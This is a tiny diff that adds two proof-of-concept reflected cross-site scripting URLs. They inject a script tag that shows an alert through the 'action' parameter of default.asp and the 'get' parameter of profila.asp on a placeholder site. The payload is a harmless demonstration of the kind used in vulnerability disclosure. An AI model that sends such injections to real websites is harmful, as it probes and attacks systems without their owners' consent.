@@ -1,0 +1,6 @@
+http://www.example.com/default.asp?action="><script>alert('Xss
+Vulnerability');</script>
+
+http://www.example.com/profila.asp?get="><script>alert('Xss
+Vulnerability');</script>&URL=%2FDefault%2Easp%3F
+
